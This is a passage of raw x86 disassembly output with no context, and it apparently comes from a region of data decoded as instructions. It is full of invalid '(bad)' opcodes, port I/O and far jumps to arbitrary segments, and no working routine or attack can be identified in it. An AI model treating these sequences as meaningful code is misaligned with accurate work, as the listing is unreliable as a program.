  4145da:	mov    dh,0xa3
  4145dc:	jge    0x4145b0
  4145de:	pop    ecx
  4145df:	push   es
  4145e0:	pop    es
  4145e1:	sub    eax,0x3a6ccc1b
  4145e6:	mov    ebp,0x52d688af
  4145eb:	mov    ecx,0x5daada7
  4145f0:	jno    0x41461f
  4145f2:	retf   0xa412
  4145f5:	jae    0x414668
  4145f7:	or     ecx,DWORD PTR [eax+0x55]
  4145fa:	push   edi
  4145fb:	je     0x4145ce
  4145fd:	mov    ebx,0x61b00d95
  414602:	out    0x4e,al
  414604:	retf   
  414605:	sar    BYTE PTR ds:0x86b96adc,cl
  41460b:	add    DWORD PTR [ecx],edx
  41460d:	inc    ecx
  41460e:	addr16 pushf 
  414610:	xor    cl,bl
  414612:	mov    ds:0x42c29c8c,eax
  414617:	sbb    al,0x44
  414619:	repz and DWORD PTR [esi+0x72],ebp
  41461d:	sbb    eax,0x5a72fc06
  414622:	mov    bh,0x8c
  414624:	pop    ecx
  414625:	ds loopne 0x4145f8
  414628:	cs int 0x51
  41462b:	clc    
  41462c:	aas    
  41462d:	or     ah,0x1c
  414630:	stc    
  414631:	into   
  414632:	rcr    ebp,cl
  414634:	mov    ecx,0x2051afcf
  414639:	retf   
  41463a:	mov    ds:0x5d109392,eax
  41463f:	dec    BYTE PTR [eax+ebp*4-0x2d87dacc]
  414646:	mov    ecx,DWORD PTR [eax]
  414648:	cdq    
  414649:	inc    edx
  41464a:	les    edx,FWORD PTR [ebx]
  41464c:	xor    bh,cl
  41464e:	inc    esi
  41464f:	adc    BYTE PTR [ecx],cl
  414651:	inc    esp
  414652:	mov    ds:0x982505ca,eax
  414657:	mov    eax,0x67db8cc9
  41465c:	mov    al,0x54
  41465e:	mov    ebp,0x3ec1dc0c
  414663:	test   DWORD PTR [ecx-0x7fa19e69],esi
  414669:	mov    edi,0x5bb607ac
  41466e:	sahf   
  41466f:	out    0x83,al
  414671:	(bad)  
  414672:	jmp    0x190f:0xafd9f403
  414679:	cwde   
  41467a:	imul   esp,DWORD PTR ds:0x9b31c4b0,0x3d
  414681:	rol    BYTE PTR [ecx-0x6fc24759],cl
  414687:	mov    edi,0x4a01ed9d
  41468c:	pop    ebx
  41468d:	sbb    eax,0x4e0edf14
  414692:	test   DWORD PTR [edx],esi
  414694:	daa    
  414695:	xor    BYTE PTR [ecx+edi*4-0x4cfa29c9],ch
  41469c:	and    BYTE PTR [ebp-0x31],dh
  41469f:	mov    esp,0x7b725b63
  4146a4:	in     al,dx
  4146a5:	push   esi
  4146a6:	jecxz  0x414692
  4146a8:	cmc    
  4146a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146aa:	xchg   edi,eax
  4146ab:	(bad)  [ecx]
  4146ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146ae:	popa   
  4146af:	nop
  4146b0:	cwde   
  4146b1:	jmp    0x4146e9
  4146b3:	adc    DWORD PTR [ecx],ebp
  4146b5:	shl    DWORD PTR [edi-0x29],cl
  4146b8:	ja     0x414665
  4146ba:	mov    edi,0xd33f3fbb
  4146bf:	ja     0x414655
  4146c1:	and    DWORD PTR [esi+0x6],eax
  4146c4:	nop
  4146c5:	idiv   edi
  4146c7:	rcr    DWORD PTR [esp+eiz*8+0x7f],cl
  4146cb:	push   ecx
  4146cc:	push   0x9172b570
  4146d1:	add    al,0x67
  4146d3:	adc    al,0xa8
  4146d5:	nop
  4146d6:	ins    DWORD PTR es:[edi],dx
  4146d7:	sub    ebp,DWORD PTR [eax]
  4146d9:	xor    eax,0x5d2ea797
  4146de:	jl     0x4146a2
  4146e0:	das    
  4146e1:	test   BYTE PTR [edx+0x242551c],bh
  4146e7:	xchg   ebp,eax
  4146e8:	shl    DWORD PTR [eax],cl
  4146ea:	leave  
  4146eb:	inc    ebx
  4146ec:	pop    esp
  4146ed:	xchg   ebx,eax
  4146ee:	ins    BYTE PTR es:[edi],dx
  4146ef:	and    al,0x65
  4146f1:	pusha  
  4146f2:	lea    ebx,[edi+ebx*2-0x25]
  4146f6:	and    eax,0x16e31854
  4146fb:	lods   al,BYTE PTR ds:[esi]
  4146fc:	(bad)  
  4146fd:	lods   eax,DWORD PTR ds:[esi]
  4146fe:	mov    ebp,DWORD PTR [eax]
  414700:	push   es
  414701:	aam    0x55
  414703:	dec    ebp
  414704:	mov    bh,0xd8
  414706:	outs   dx,DWORD PTR ds:[esi]
  414707:	jecxz  0x4146df
  414709:	shl    BYTE PTR [eax-0x7e],0x44
  41470d:	mov    ecx,0xa87a395
  414712:	out    dx,eax
  414713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414714:	pop    ecx
  414715:	popa   
  414716:	jo     0x41477f
  414718:	or     DWORD PTR [esi+ecx*1-0x3fb2cd6f],esi
  41471f:	rol    BYTE PTR [edx],1
  414721:	pop    ebx
  414722:	test   BYTE PTR [edx+0x7f910e58],dh
  414728:	leave  
  414729:	jo     0x4146d4
  41472b:	and    ecx,esp
  41472d:	fadd   st(2),st
  41472f:	es iret 
  414731:	and    al,BYTE PTR [ecx+ebx*1]
  414734:	pop    edi
  414735:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414736:	int3   
  414737:	shl    BYTE PTR [edi],1
  414739:	push   0x95e5939d
  41473e:	jb     0x414785
  414740:	pop    ebp
  414741:	cmp    esp,edx
  414743:	adc    al,0x5e
  414745:	jne    0x4146de
  414747:	inc    ebp
  414748:	pop    eax
  414749:	fadd   QWORD PTR ds:0xecaca0e6
  41474f:	jns    0x414738
  414751:	scas   al,BYTE PTR es:[edi]
  414752:	into   
  414753:	out    0x28,eax
  414755:	xlat   BYTE PTR ds:[ebx]
  414756:	jae    0x41470c
  414758:	mov    cl,0xed
  41475a:	or     eax,0xc73fba4d
  41475f:	add    eax,0xabe1e006
  414764:	pop    es
  414765:	jmp    0x68010315
  41476a:	dec    ebp
  41476b:	xor    eax,0x544725a1
  414770:	xor    BYTE PTR [edi+edi*8-0x37],ch
  414774:	lahf   
  414775:	in     eax,0x26
  414777:	les    eax,FWORD PTR [ebx]
  414779:	pop    edi
  41477a:	xchg   edi,eax
  41477b:	bound  ebx,QWORD PTR [edx]
  41477d:	dec    edx
  41477e:	mov    ss,WORD PTR [edx+ecx*8-0x65]
  414782:	add    edx,DWORD PTR [esi+0x30]
  414785:	ins    DWORD PTR es:[edi],dx
  414786:	jmp    0xd91:0x3bb09b14
  41478d:	dec    ecx
  41478e:	test   BYTE PTR gs:[edx+0x4b],ah
  414792:	and    DWORD PTR [esi+ebp*8+0x6a40cfd3],ecx
  414799:	mov    ?,ebx
  41479b:	es aad 0xce
  41479e:	icebp  
  41479f:	xor    eax,0xea486df1
  4147a4:	adc    bl,bh
  4147a6:	stc    
  4147a7:	pop    esp
  4147a8:	pop    ebx
  4147a9:	mov    dh,0xaf
  4147ab:	sub    bl,BYTE PTR ds:0x8916dcb8
  4147b1:	fmul   QWORD PTR [edx+0x7a7736e1]
  4147b7:	popf   
  4147b8:	ds pop edi
  4147ba:	dec    ebx
  4147bb:	into   
  4147bc:	call   0x63f79f6d
  4147c1:	loope  0x41481f
  4147c3:	setno  BYTE PTR [eax+0x8]
  4147c7:	inc    esp
  4147c8:	cmp    al,0x1e
  4147ca:	rcl    BYTE PTR [edx-0xf],0x11
  4147ce:	adc    eax,0x4132fba3
  4147d3:	mov    ah,0xdc
  4147d5:	not    DWORD PTR [ecx]
  4147d7:	popa   
  4147d8:	or     dl,BYTE PTR ds:0x2326b3b0
  4147de:	mov    bh,0xa2
  4147e0:	inc    esi
  4147e1:	pushf  
  4147e2:	mov    ecx,0xea756c95
  4147e7:	cmp    DWORD PTR [ebp-0x7d5326e8],0xffffff8c
  4147ee:	mov    al,0x44
  4147f0:	mov    bl,0xa3
  4147f2:	mov    esi,0x6ed68158
  4147f7:	scas   eax,DWORD PTR es:[edi]
  4147f8:	nop
  4147f9:	fst    QWORD PTR [esp+edx*2+0x780fc7c4]
  414800:	xchg   BYTE PTR [esi+0x60cb4692],bh
  414806:	cmp    esi,ebx
  414808:	mov    ecx,0xb8cdb58e
  41480d:	mov    dl,0xe6
  41480f:	lds    esi,FWORD PTR [bp+si+0x5f]
  414813:	ins    DWORD PTR es:[edi],dx
  414814:	sub    ebp,ebp
  414816:	push   ds
  414817:	icebp  
  414818:	and    al,0xbd
  41481a:	das    
  41481b:	pop    ds
  41481c:	cdq    
  41481d:	in     al,0x2
  41481f:	leave  
  414820:	or     eax,0x89b1737c
  414825:	sub    ebx,DWORD PTR [edi]
  414827:	sub    ah,BYTE PTR [edx+0x1e]
  41482a:	int3   
  41482b:	push   ebx
  41482c:	cmp    BYTE PTR [ebx+0x7bd9517d],ch
  414832:	pop    ss
  414833:	sti    
  414834:	test   DWORD PTR [edi+0x50],edx
  414837:	aam    0xba
  414839:	cli    
  41483a:	call   0xa699487
  41483f:	daa    
  414840:	pop    edx
  414841:	push   edi
  414842:	mov    bl,0x86
  414844:	jecxz  0x4148a6
  414846:	ins    DWORD PTR es:[edi],dx
  414847:	fcom   DWORD PTR cs:[ebx+eax*2-0x422057b2]
  41484f:	sub    BYTE PTR [edi+0x52],ah
  414852:	inc    esp
  414853:	sbb    ch,BYTE PTR ds:0x282b58d8
  414859:	push   ds
  41485a:	mov    ecx,0xf59a66c5
  41485f:	shr    BYTE PTR [ebx-0x3e],1
  414862:	cmp    eax,0xbb31bd74
  414867:	sbb    edx,DWORD PTR [eax]
  414869:	add    DWORD PTR [ebx],esp
  41486b:	mov    al,ds:0xa02ec8b1
  414870:	outs   dx,BYTE PTR ds:[esi]
  414871:	or     esi,DWORD PTR [ebp+0x67]
  414874:	cmp    BYTE PTR [eax],bl
  414876:	sahf   
  414877:	sar    DWORD PTR [ecx],cl
  414879:	add    eax,0xdf0eb89
  41487e:	dec    ebx
  41487f:	in     eax,dx
  414880:	push   esi
  414881:	stos   BYTE PTR es:[edi],al
  414882:	scas   al,BYTE PTR es:[edi]
  414883:	mov    esp,0x6d15360
  414888:	mov    fs,esp
  41488a:	pop    esp
  41488b:	js     0x414838
  41488d:	mov    ds:0xbac7f565,al
  414892:	cmp    al,0xa8
  414894:	pop    ecx
  414895:	les    ecx,FWORD PTR [esi]
  414897:	retf   
  414898:	enter  0x96d0,0xcd
  41489c:	adc    eax,0x768385a6
  4148a1:	fld    TBYTE PTR [edi]
  4148a3:	adc    ch,BYTE PTR [eax]
  4148a5:	mov    edi,0xa7f2adc9
  4148aa:	daa    
  4148ab:	push   ss
  4148ac:	call   0x26c6c63a
  4148b1:	lods   eax,DWORD PTR ds:[esi]
  4148b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148b3:	jge    0x41485c
  4148b5:	or     eax,0xc2298d9f
  4148ba:	mov    WORD PTR [edi+0x2faec111],gs
  4148c0:	xlat   BYTE PTR ds:[ebx]
  4148c1:	cmp    eax,DWORD PTR [ecx+0x4d]
  4148c4:	cmc    
  4148c5:	leave  
  4148c6:	dec    esp
  4148c7:	test   al,0xff
  4148c9:	popf   
  4148ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148cc:	lods   eax,DWORD PTR ds:[esi]
  4148cd:	sti    
  4148ce:	out    0x65,al
  4148d0:	ss ret 0x1ad8
  4148d4:	or     BYTE PTR [esi+0x40],0xc3
  4148d8:	push   ebx
  4148d9:	mov    BYTE PTR [esi-0x2533d05c],ch
  4148df:	and    BYTE PTR [esi-0x77c93647],0x7d
  4148e6:	cdq    
  4148e7:	or     esi,ecx
  4148e9:	xchg   BYTE PTR [eax-0x23a8b9c2],dh
  4148ef:	cdq    
  4148f0:	xor    ch,BYTE PTR [esi+0x3866d4ff]
  4148f6:	jecxz  0x414886
  4148f8:	into   
  4148f9:	pusha  
  4148fa:	xchg   edi,eax
  4148fb:	scas   al,BYTE PTR es:[edi]
  4148fc:	shr    DWORD PTR [edi-0x653069df],cl
  414902:	cmp    esi,DWORD PTR [esi+0x6144396e]
  414908:	cdq    
  414909:	aas    
  41490a:	fistp  QWORD PTR [edx+ebp*4-0xf]
  41490e:	aaa    
  41490f:	pop    es
  414910:	xchg   DWORD PTR [ecx-0x80],edi
  414913:	mov    ds:0x4393e8a2,eax
  414918:	mov    bh,0xa1
  41491a:	inc    eax
  41491b:	dec    esp
  41491c:	je     0x414985
  41491e:	cmp    BYTE PTR [edi-0x4c],bh
  414921:	lods   eax,DWORD PTR ds:[esi]
  414922:	lods   al,BYTE PTR ds:[esi]
  414923:	xchg   ebx,eax
  414924:	jg     0x4148f3
  414926:	js     0x4148bd
  414928:	(bad)  
  414929:	fmul   DWORD PTR [edx]
  41492b:	adc    eax,0xd53209d7
  414930:	cmc    
  414931:	stos   BYTE PTR es:[edi],al
  414932:	sub    DWORD PTR [esi+0x14],ebp
  414935:	pop    ds
  414936:	mov    dl,0x23
  414938:	or     eax,0xbe66c47b
  41493d:	pop    esp
  41493e:	rcl    BYTE PTR [di],cl
  414941:	adc    eax,0xaaf6fbf2
  414946:	push   esi
  414947:	xchg   esi,eax
  414948:	xchg   ebp,eax
  414949:	scas   eax,DWORD PTR es:[edi]
  41494a:	ins    DWORD PTR es:[edi],dx
  41494b:	push   cs
  41494c:	or     BYTE PTR [edi],0x26
  41494f:	adc    eax,0xc65069a8
  414954:	or     ecx,DWORD PTR [edx+0x34]
  414957:	push   ss
  414958:	neg    al
  41495a:	(bad)  
  41495b:	mov    dh,0xc3
  41495d:	stos   DWORD PTR es:[edi],eax
  41495e:	xchg   esp,eax
  41495f:	test   al,0xdc
  414961:	std    
  414962:	aas    
  414963:	mov    DWORD PTR [edx-0x7b],edi
  414966:	add    BYTE PTR [ecx+0x2951847b],0x82
  41496d:	out    dx,eax
  41496e:	jge    0x41490d
  414970:	xchg   ebp,eax
  414971:	aam    0x18
  414973:	push   ecx
  414974:	pop    edi
  414975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414976:	jmp    0x41493f
  414978:	inc    esi
  414979:	xor    eax,0xeb962797
  41497e:	sub    al,0x38
  414980:	int3   
  414981:	dec    edx
  414982:	xor    esp,edi
  414984:	fsubr  DWORD PTR [eax-0x5f6cbe6f]
  41498a:	jmp    0xb574:0x234faee7
  414991:	(bad)  
  414992:	lods   al,BYTE PTR ds:[esi]
  414993:	cmp    edi,DWORD PTR [ebp-0x20]
  414996:	dec    ebp
  414997:	gs in  al,dx
  414999:	mov    BYTE PTR [ebx],al
  41499b:	ficom  WORD PTR ss:[eax-0x523b998c]
  4149a2:	retf   
  4149a3:	test   dh,dh
  4149a5:	lods   eax,DWORD PTR ds:[esi]
  4149a6:	dec    esi
  4149a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149a8:	rcl    BYTE PTR [ecx-0x37d21d40],cl
  4149ae:	mov    WORD PTR [edx],es
  4149b0:	sbb    esi,DWORD PTR ds:0xff5b2c5b
  4149b6:	mov    ebp,0x1eb463ce
  4149bb:	aam    0x57
  4149bd:	fidiv  WORD PTR [eax]
  4149bf:	push   cs
  4149c0:	out    dx,eax
  4149c1:	adc    cl,cl
  4149c3:	test   edx,ebx
  4149c5:	sub    eax,0x617653c2
  4149ca:	or     esi,ecx
  4149cc:	mov    ebp,0xeb507af8
  4149d1:	clc    
  4149d2:	pop    ebx
  4149d3:	test   al,0xa7
  4149d5:	xor    eax,DWORD PTR [ecx]
  4149d7:	adc    DWORD PTR [esi-0x6f],esi
  4149da:	xor    eax,0xbf22f64d
  4149df:	xchg   edx,eax
  4149e0:	inc    eax
  4149e1:	adc    ch,BYTE PTR [eax+0x70]
  4149e4:	dec    ebp
  4149e5:	and    DWORD PTR [ecx+esi*8],0x49
  4149e9:	pop    eax
  4149ea:	dec    edi
  4149eb:	nop    DWORD PTR [eax+0x1d]
  4149ef:	add    al,0xf1
  4149f1:	xchg   BYTE PTR [edi-0x33],ch
  4149f4:	adc    esp,ecx
  4149f6:	into   
  4149f7:	imul   ebp,DWORD PTR [eax+ecx*8+0x32],0x2f2aa23
  4149ff:	rol    ecx,cl
  414a01:	and    BYTE PTR [edi-0x22],dh
  414a04:	mov    edi,0x6f4b9423
  414a09:	mov    eax,ds:0x3adf3709
  414a0e:	sub    eax,0xf97ffbb8
  414a13:	retf   
  414a14:	dec    edi
  414a15:	pop    edx
  414a16:	pop    ss
  414a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a18:	mov    ah,BYTE PTR [ebx]
  414a1a:	rol    BYTE PTR [eax+ebx*2],1
  414a1d:	xor    ch,BYTE PTR [edi+0x7b]
  414a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a21:	mov    edx,0x93005bab
  414a26:	out    dx,eax
  414a27:	or     eax,0x8cb6cb6b
  414a2c:	pop    esi
  414a2d:	adc    ah,BYTE PTR [ebx+ecx*2-0x3d59f2c3]
  414a34:	mov    bl,0xa9
  414a36:	inc    ebp
  414a37:	push   esi
  414a38:	mov    dh,0xce
  414a3a:	jmp    0x8b70:0x7f25b813
  414a41:	shl    BYTE PTR [ebx+0x42],cl
  414a44:	mov    bh,0xb0
  414a46:	adc    al,0xf3
  414a48:	fs loopne 0x414a5e
  414a4b:	mov    ds:0x8035e4bf,eax
  414a50:	ss enter 0xe992,0x41
  414a55:	dec    ebp
  414a56:	xor    DWORD PTR [edx+ebx*8-0x4f4ca934],edx
  414a5d:	in     eax,dx
  414a5e:	inc    eax
  414a5f:	adc    esi,DWORD PTR [eax+0x65e5f039]
  414a65:	xor    al,0xcc
  414a67:	ins    BYTE PTR es:[edi],dx
  414a68:	xchg   edi,eax
  414a69:	out    dx,ax
  414a6b:	mov    al,0x24
  414a6d:	adc    dh,BYTE PTR [ecx+0x21814c85]
  414a73:	test   al,0xab
  414a75:	in     al,0xde
  414a77:	mov    bh,0x45
  414a79:	imul   ebx,ecx,0x182fb113
  414a7f:	es pop edi
  414a81:	int3   
  414a82:	mov    esi,0xb2716cdd
  414a87:	and    DWORD PTR [eax-0x22],eax
  414a8a:	adc    BYTE PTR [edx-0x2a8b6cdd],bh
  414a90:	pop    es
  414a91:	adc    al,0x32
  414a93:	mov    ecx,0x771f52b4
  414a98:	out    0x66,al
  414a9a:	jno    0x414a83
  414a9c:	or     ecx,DWORD PTR [ecx-0x78e1b656]
  414aa2:	cmp    al,BYTE PTR [ebx-0x4e]
  414aa5:	sub    eax,0xb274479f
  414aaa:	xor    bh,cl
  414aac:	and    al,0x43
  414aae:	sub    eax,0xd399c6d6
  414ab3:	sub    BYTE PTR [edx-0x44e1f90e],bl
  414ab9:	xor    DWORD PTR [ecx+esi*1+0x254bda59],esi
  414ac0:	jg     0x414ad0
  414ac2:	adc    eax,0x7db35537
  414ac7:	ins    BYTE PTR es:[edi],dx
  414ac8:	adc    eax,0xcfefa0d7
  414acd:	sbb    dh,BYTE PTR [eax-0xa929b36]
  414ad3:	mov    WORD PTR [esi],cs
  414ad5:	push   esp
  414ad6:	or     BYTE PTR [esi+0x27],cl
  414ad9:	xchg   edx,eax
  414ada:	stos   DWORD PTR es:[edi],eax
  414adb:	mov    edi,0x5738dda7
  414ae0:	scas   al,BYTE PTR es:[edi]
  414ae1:	inc    edi
  414ae2:	push   edi
  414ae3:	dec    DWORD PTR [ecx+eax*4-0x23fdfd66]
  414aea:	cmp    esi,ebx
  414aec:	sbb    DWORD PTR [esi+ecx*8],esi
  414aef:	hlt    
  414af0:	pop    ebx
  414af1:	inc    ebp
  414af2:	cld    
  414af3:	scas   eax,DWORD PTR es:[edi]
  414af4:	aaa    
  414af5:	je     0x414b25
  414af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414af8:	cmovs  edx,DWORD PTR [esi]
  414afb:	pop    ss
  414afc:	out    dx,eax
  414afd:	mov    ds:0x5bb38db7,al
  414b02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b03:	in     al,0xf9
  414b05:	or     BYTE PTR [eax-0x1e],bh
  414b08:	xchg   DWORD PTR [ebp-0x20c33f29],edi
  414b0e:	xchg   DWORD PTR [esi],esi
  414b10:	daa    
  414b11:	aam    0xde
  414b13:	stos   BYTE PTR es:[edi],al
  414b14:	dec    edx
  414b15:	mov    al,ds:0x8e06fce8
  414b1a:	retf   0x5b05
  414b1d:	ss js  0x414ab1
  414b20:	and    edx,edx
  414b22:	mov    dl,0xa2
  414b24:	mov    eax,ds:0x165c61fb
  414b29:	or     edx,DWORD PTR [eax+0x731e9fe3]
  414b2f:	xchg   ebp,eax
  414b30:	je     0x414b3c
  414b32:	mov    eax,ds:0xbd1b84b3
  414b37:	(bad)  
  414b38:	push   edi
  414b39:	sar    DWORD PTR [ebx+0x4cb6e41c],0xa1
  414b40:	push   esp
  414b41:	mov    edi,0x4b3bb052
  414b46:	mov    WORD PTR [esi-0x32],gs
  414b49:	jmp    0x383f:0xa8faf04d
  414b50:	mov    BYTE PTR [esi],al
  414b52:	mov    esi,0xcafc289
  414b57:	test   DWORD PTR [ebp+0x4f],edi
  414b5a:	dec    eax
  414b5b:	pop    edx
  414b5c:	aad    0xb6
  414b5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b5f:	ret    0x7e41
  414b62:	cld    
  414b63:	cmp    al,BYTE PTR [eax-0x69dda16d]
  414b69:	jb     0x414bc7
  414b6b:	push   ebx
  414b6c:	retf   
  414b6d:	pop    edi
  414b6e:	xchg   DWORD PTR [eax-0x5016c0f9],ebp
  414b74:	daa    
  414b75:	in     al,0xbe
  414b77:	loop   0x414b16
  414b79:	dec    esi
  414b7a:	dec    esp
  414b7b:	and    dl,BYTE PTR ds:0x1547e8b8
  414b81:	xchg   edi,eax
  414b82:	mov    eax,0x4759795e
  414b87:	jns    0x414b46
  414b89:	sbb    eax,0xba24252e
  414b8e:	imul   ecx,DWORD PTR [eax+ecx*4+0x6e],0xfffffffb
  414b93:	call   0xb20b90d1
  414b98:	xchg   edi,eax
  414b99:	mov    ebx,0x3f161211
  414b9e:	dec    ecx
  414b9f:	xor    BYTE PTR [esi+0x53],0x1a
  414ba3:	out    dx,eax
  414ba4:	add    DWORD PTR [ebp+0x2d],edx
  414ba7:	adc    ah,BYTE PTR [edi-0x57]
  414baa:	enter  0x5088,0x35
  414bae:	aas    
  414baf:	jne    0x414b9f
  414bb1:	mov    eax,0xbf3a27a5
  414bb6:	ficom  WORD PTR [edx+0x11fd1dd7]
  414bbc:	mov    bh,0xd2
  414bbe:	jne    0x414b60
  414bc0:	xlat   BYTE PTR ds:[ebx]
  414bc1:	jge    0x414ba9
  414bc3:	dec    edx
  414bc4:	arpl   WORD PTR [ebx],si
  414bc6:	or     al,0x7
  414bc8:	xor    dl,BYTE PTR [edx+esi*1-0x5c276f34]
  414bcf:	fnstenv [esi+0x39]
  414bd2:	dec    ebp
  414bd3:	push   cs
  414bd4:	add    BYTE PTR [esi],al
  414bd6:	arpl   WORD PTR [edx-0x209b1c59],di
  414bdc:	dec    esp
  414bdd:	les    esi,FWORD PTR [esi-0x2eee6761]
  414be3:	iret   
  414be4:	aaa    
  414be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414be6:	pop    edi
  414be7:	sub    esp,DWORD PTR [eax+ebp*4+0x20]
  414beb:	cmp    esp,edx
  414bed:	inc    ebp
  414bee:	dec    esp
  414bef:	push   edi
  414bf0:	loopne 0x414c4b
  414bf2:	in     eax,0xc9
  414bf4:	call   0x894e:0xfddf28aa
  414bfb:	test   al,0x84
  414bfd:	dec    eax
  414bfe:	mov    fs,edx
  414c00:	popf   
  414c01:	jge    0x414b8b
  414c03:	adc    BYTE PTR [eax-0x56c64944],0xf7
  414c0a:	add    BYTE PTR [edx-0x8],0x69
  414c0e:	arpl   sp,bx
  414c10:	(bad)
  414c14:	bound  edi,QWORD PTR [edi-0x5]
  414c17:	and    al,0xf7
  414c19:	jne    0x414be0
  414c1b:	sar    BYTE PTR [edi+0x66],1
  414c1e:	cmp    eax,0x322500b
  414c23:	mov    al,0xc4
  414c25:	xor    ah,BYTE PTR [esi]
  414c27:	cs cli 
  414c29:	fdivr  QWORD PTR [ebp+0x7c2c974b]
  414c2f:	add    DWORD PTR [esi+0x7fedc236],0xebdf5ed4
  414c39:	fwait
  414c3a:	int    0x53
  414c3c:	icebp  
  414c3d:	xchg   edx,eax
  414c3e:	push   ds
  414c3f:	mov    ds:0xedfda077,al
  414c44:	jne    0x414c5c
  414c46:	std    
  414c47:	std    
  414c48:	loopne 0x414c6b
  414c4a:	adc    al,0xeb
  414c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c4d:	sub    DWORD PTR [ebx],edx
  414c4f:	inc    ecx
  414c50:	xor    ah,BYTE PTR [ecx+0x2f4a01dd]
  414c56:	int3   
  414c57:	clc    
  414c58:	mov    ds:0x6097bd06,eax
  414c5d:	mov    WORD PTR [edx],es
  414c5f:	or     al,0xa2
  414c61:	mov    dh,0xf2
  414c63:	cmp    eax,0x7a21a47
  414c68:	imul   edx,edi,0x32
  414c6b:	out    0xd9,eax
  414c6d:	fnsave [edx+0x2034622b]
  414c73:	cld    
  414c74:	outs   dx,BYTE PTR ds:[esi]
  414c75:	into   
  414c76:	sub    al,0x50
  414c78:	mov    al,ds:0x4334783
  414c7d:	cmp    eax,0x90fb436
  414c82:	xchg   esi,eax
  414c83:	nop
  414c84:	and    ah,BYTE PTR [edi-0x1f]
  414c87:	xor    al,0x89
  414c89:	pop    ebp
  414c8a:	inc    ebx
  414c8b:	pop    esi
  414c8c:	aam    0xb2
  414c8e:	pop    esp
  414c8f:	cmp    al,0x9e
  414c91:	mov    cl,0x3d
  414c93:	xchg   ebx,eax
  414c94:	stc    
  414c95:	and    al,0x29
  414c97:	lock and DWORD PTR [edx+ebp*2],ecx
  414c9b:	push   ebp
  414c9c:	lds    edi,FWORD PTR [edi+0x1e]
  414c9f:	in     eax,0x80
  414ca1:	loopne 0x414d1c
  414ca3:	mov    esi,0x2ce0a4dd
  414ca8:	mov    al,0x12
  414caa:	pop    ecx
  414cab:	pop    ecx
  414cac:	mov    al,0xa1
  414cae:	push   0x3e
  414cb0:	shl    al,1
  414cb2:	dec    BYTE PTR ds:0x317bd80e
  414cb8:	inc    esp
  414cb9:	cmp    ah,BYTE PTR [ebp+0x58]
  414cbc:	push   ebx
  414cbd:	fsubr  DWORD PTR [edx]
  414cbf:	adc    eax,0x86e69c99
  414cc4:	outs   dx,DWORD PTR ds:[esi]
  414cc5:	call   esp
  414cc7:	inc    edx
  414cc8:	(bad)  
  414cc9:	mov    WORD PTR [eax+0x28a3c53d],fs
  414ccf:	pop    eax
  414cd0:	pushf  
  414cd1:	mov    BYTE PTR [edi-0x7b82ee87],dl
  414cd7:	sbb    al,0xfd
  414cd9:	jge    0x414d1f
  414cdb:	add    BYTE PTR [esi-0x43],ah
  414cde:	push   esi
  414cdf:	fs jmp 0x414c6e
  414ce2:	or     bl,BYTE PTR [edx]
  414ce4:	(bad)  
  414ce5:	mov    ch,0xdc
  414ce7:	sar    BYTE PTR [ecx+0x720dcc9],0xc2
  414cee:	mov    edi,0x98cd75aa
  414cf3:	(bad)  
  414cf4:	(bad)  
  414cf5:	xchg   edx,eax
  414cf6:	loopne 0x414d2e
  414cf8:	mov    eax,ds:0x1a16a943
  414cfd:	adc    eax,0xdaa85ac8
  414d02:	call   0xbaf22d3d
  414d07:	out    dx,eax
  414d08:	push   ebp
  414d09:	push   ebx
  414d0a:	sub    BYTE PTR [ebx],cl
  414d0c:	mov    ds:0x3a1f3365,eax
  414d11:	test   al,0x69
  414d13:	addr16 inc edi
  414d15:	mov    al,0xc0
  414d17:	sti    
  414d18:	mov    bl,0xd
  414d1a:	fmul   DWORD PTR [ecx+0x36]
  414d1d:	sub    esi,0x1c816701
  414d23:	(bad)  
  414d24:	lods   al,BYTE PTR ds:[esi]
  414d25:	lock push 0x4
  414d28:	test   eax,0x27573fe1
  414d2d:	loope  0x414d91
  414d2f:	repnz clc 
  414d31:	xor    DWORD PTR ds:0x65d8a63d,ecx
  414d37:	mov    edx,0x2edba7f2
  414d3c:	jns    0x414ced
  414d3e:	cmp    al,0xac
  414d40:	adc    esp,edx
  414d42:	or     DWORD PTR [ebx+0x58],edi
  414d45:	shl    BYTE PTR [ebx-0x77],1
  414d48:	add    ebp,0xffffffb2
  414d4b:	das    
  414d4c:	aam    0xec
  414d4e:	stos   BYTE PTR es:[edi],al
  414d4f:	adc    BYTE PTR ds:[edx-0x267527a0],0x2
  414d57:	mov    BYTE PTR [esi+0x797be6d4],ch
  414d5d:	call   0x9077:0x3c77aa37
  414d64:	fwait
  414d65:	and    eax,0x34078a5f
  414d6a:	xchg   ebp,eax
  414d6b:	pop    eax
  414d6c:	sbb    BYTE PTR [ebx+0x6e01bb29],bl
  414d72:	inc    ecx
  414d73:	pop    esp
  414d74:	scas   eax,DWORD PTR es:[edi]
  414d75:	test   DWORD PTR [ecx+ebx*1-0x32],0xcc3ba4a0
  414d7d:	loope  0x414d17
  414d7f:	sbb    bl,BYTE PTR [edx]
  414d81:	pop    edx
  414d82:	gs pop edx
  414d84:	jmp    0xa6f:0xb3b655a
  414d8b:	dec    ebx
  414d8c:	mov    dh,0xcf
  414d8e:	push   ss
  414d8f:	inc    esi
  414d90:	and    eax,0x8f6fd2ad
  414d95:	enter  0x4756,0x12
  414d99:	add    ecx,DWORD PTR [ebx+0x1635a61e]
  414d9f:	push   0x79
  414da1:	mov    cl,dl
  414da3:	das    
  414da4:	jbe    0x414df5
  414da6:	or     DWORD PTR [ebp+eiz*1-0x77],eax
  414daa:	das    
  414dab:	rcl    DWORD PTR [edx+0x32f67b8],cl
